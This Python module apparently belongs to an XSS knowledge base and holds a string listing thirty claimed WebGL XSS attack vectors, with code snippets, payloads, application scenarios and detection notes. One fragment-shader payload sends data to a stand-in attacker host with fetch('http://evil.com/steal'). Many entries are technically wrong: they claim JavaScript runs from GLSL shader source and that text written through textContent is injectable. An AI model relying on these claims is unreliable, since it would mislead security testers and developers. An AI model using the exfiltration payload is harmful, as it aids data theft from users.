#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-04 19:21:27 UTC
Status: Created
Telegram: https://t.me/easyprotech

WebGL XSS Context - Attack Vectors Module
"""

ATTACK_VECTOR = """
WEBGL XSS ATTACK VECTORS:

1. VERTEX SHADER INJECTION:
   Shader source code injection:
   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' +
                             'uniform mat4 uModelViewMatrix; ' +
                             'void main() { ' +
                             'gl_Position = uModelViewMatrix * aVertexPosition; ' +
                             USER_INPUT +  // Shader injection
                             '}';

   Attack payload:
   '; gl_FragColor = vec4(1.0, 0.0, 0.0, 1.0); /*

2. FRAGMENT SHADER INJECTION:
   Fragment shader with XSS:
   const fragmentShaderSource = 'precision mediump float; ' +
                                'void main() { ' +
                                USER_INPUT +  // Fragment injection
                                '}';

   Attack payload:
   'gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch("http://evil.com/steal", {method: "POST", body: "xss"}); /*

3. UNIFORM VARIABLE INJECTION:
   Setting uniform variables with XSS:
   const shaderProgram = initShaderProgram(gl, vsSource, fsSource);

   // Setting uniform with user data
   gl.uniform1f(shaderProgram.uTime, USER_INPUT);  // Time uniform injection
   gl.uniform3fv(shaderProgram.uColor, USER_INPUT); // Color uniform injection

4. TEXTURE DATA INJECTION:
   Creating textures with malicious content:
   const texture = gl.createTexture();
   gl.bindTexture(gl.TEXTURE_2D, texture);

   const imageData = new ImageData(new Uint8ClampedArray(USER_INPUT), width, height);
   gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, gl.RGBA, gl.UNSIGNED_BYTE, imageData);

5. VERTEX BUFFER INJECTION:
   Vertex array with malicious data:
   const vertices = new Float32Array([
     -1.0, -1.0, 0.0,
     1.0, -1.0, 0.0,
     0.0, 1.0, 0.0,
     USER_INPUT  // Vertex data injection
   ]);

ADVANCED WEBGL XSS TECHNIQUES:

6. SHADER PRECISION INJECTION:
   Precision qualifier injection:
   const shaderSource = USER_INPUT + ' float; ' +  // Precision injection
                       'void main() { gl_FragColor = vec4(1.0); }';

   Attack payload:
   'highp /* alert(1) */'

7. EXTENSION INJECTION:
   WebGL extensions with XSS:
   const ext = gl.getExtension('WEBGL_debug_renderer_info');
   const renderer = gl.getParameter(ext.UNMASKED_RENDERER_WEBGL);

   // Renderer info might contain XSS if user-controlled
   document.getElementById('info').textContent = USER_INPUT;

8. FRAMEBUFFER ATTACK:
   Off-screen rendering with XSS:
   const framebuffer = gl.createFramebuffer();
   gl.bindFramebuffer(gl.FRAMEBUFFER, framebuffer);

   // Render to texture with malicious content
   const texture = createTextureFromData(USER_INPUT);

9. TRANSFORM FEEDBACK INJECTION:
   Transform feedback with malicious data:
   const transformFeedback = gl.createTransformFeedback();
   gl.bindTransformFeedback(gl.TRANSFORM_FEEDBACK, transformFeedback);

   // Feedback data might contain XSS
   const buffer = gl.createBuffer();
   gl.bindBuffer(gl.TRANSFORM_FEEDBACK_BUFFER, buffer);

10. WEBGL CONTEXT ATTRIBUTES INJECTION:
    Context creation with XSS:
    const contextAttributes = {
      alpha: true,
      depth: true,
      stencil: false,
      antialias: false,
      premultipliedAlpha: false,
      preserveDrawingBuffer: true,
      failIfMajorPerformanceCaveat: false,
      userData: USER_INPUT  // Custom attribute injection
    };

11. SHADER COMPILATION LOG INJECTION:
    Compilation errors with XSS:
    const vertexShader = gl.createShader(gl.VERTEX_SHADER);
    gl.shaderSource(vertexShader, maliciousShaderCode);
    gl.compileShader(vertexShader);

    if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
      const log = gl.getShaderInfoLog(vertexShader);
      document.getElementById('error').innerHTML = log;  // Log injection
    }

12. PROGRAM LINKING INJECTION:
    Linking shaders with XSS in attributes:
    const program = gl.createProgram();
    gl.attachShader(program, vertexShader);
    gl.attachShader(program, fragmentShader);
    gl.linkProgram(program);

    const attribLocation = gl.getAttribLocation(program, USER_INPUT);  // Attribute name injection

13. RENDER TARGET INJECTION:
    Multiple render targets with XSS:
    const drawBuffers = gl.getExtension('WEBGL_draw_buffers');

    // Render target names might be user-controlled
    const targetNames = [USER_INPUT, 'color', 'normal'];
    drawBuffers.drawBuffersWEBGL(targetNames);

14. QUERY OBJECT INJECTION:
    WebGL query objects with XSS:
    const query = gl.createQuery();
    gl.beginQuery(gl.ANY_SAMPLES_PASSED, query);

    // Query results might be displayed
    gl.endQuery(gl.ANY_SAMPLES_PASSED);
    const result = gl.getQueryParameter(query, gl.QUERY_RESULT);
    displayResult(result);

15. SYNC OBJECT INJECTION:
    WebGL sync objects with malicious data:
    const sync = gl.fenceSync(gl.SYNC_GPU_COMMANDS_COMPLETE, 0);
    gl.clientWaitSync(sync, 0, 0);

    // Sync status might contain XSS
    const status = gl.getSyncParameter(sync, gl.SYNC_STATUS);
    showStatus(status);

WEBGL-SPECIFIC BYPASSES:

16. COMMENT-BASED INJECTION:
    GLSL comments with XSS:
    const shaderSource = '/* ' + USER_INPUT + ' */ void main() { gl_FragColor = vec4(1.0); }';

    Attack payload:
    '*/ alert(1); /*'

17. PREPROCESSOR INJECTION:
    GLSL preprocessor directives with XSS:
    const shaderSource = USER_INPUT + ' \\n void main() { gl_FragColor = vec4(1.0); }';

    Attack payload:
    '#define main() alert(1); void main'

18. VERSION INJECTION:
    GLSL version string injection:
    const versionString = USER_INPUT;  // Version injection
    const shaderSource = versionString + ' \\n void main() { gl_FragColor = vec4(1.0); }';

19. EXTENSION STRING INJECTION:
    Extension strings with XSS:
    const extensions = gl.getSupportedExtensions();
    const extensionString = extensions.join(', ');

    // If extension names are user-controlled
    document.getElementById('extensions').textContent = USER_INPUT;

20. VENDOR INFO INJECTION:
    GPU vendor information:
    const vendor = gl.getParameter(gl.VENDOR);
    const renderer = gl.getParameter(gl.RENDERER);

    // Vendor/renderer might be displayed with XSS
    document.getElementById('gpu-info').innerHTML = '<b>' + USER_INPUT + '</b>';

REAL-WORLD ATTACK SCENARIOS:

21. 3D MODELING APPLICATION:
    - User uploads 3D model
    - Model metadata: <script>alert(1)</script>
    - Model name displayed in UI
    - XSS when viewing model properties

22. DATA VISUALIZATION:
    - Interactive charts and graphs
    - Dataset labels: <script>alert(1)</script>
    - Labels rendered in WebGL context
    - Affects all viewers of visualization

23. ONLINE GAME ENGINE:
    - WebGL-based game
    - Player avatar name: <script>alert(1)</script>
    - Name displayed in 3D space
    - All players see XSS execution

24. MEDICAL IMAGING:
    - DICOM viewer with WebGL
    - Patient name: <script>alert(1)</script>
    - Name displayed on scan
    - Medical data theft

25. CAD/CAM APPLICATION:
    - 3D design tool
    - Part name: <script>alert(1)</script>
    - Part properties display
    - Design data manipulation

26. VIRTUAL REALITY PLATFORM:
    - VR application with WebGL
    - User profile: <script>alert(1)</script>
    - Profile displayed in virtual space
    - VR session hijacking

27. GRAPHICS DESIGN TOOL:
    - Online Photoshop-style app
    - Layer name: <script>alert(1)</script>
    - Layer properties display
    - Project corruption

WEBGL XSS DETECTION:

28. MANUAL TESTING:
    - Browser DevTools WebGL inspection
    - Shader source code review
    - Texture data analysis
    - GPU memory inspection

29. AUTOMATED SCANNING:
    - WebGL context analysis
    - Shader compilation testing
    - Texture validation
    - GPU resource monitoring

30. BROWSER EXTENSIONS:
    - WebGL debugging extensions
    - Shader inspection tools
    - GPU memory analyzers
"""
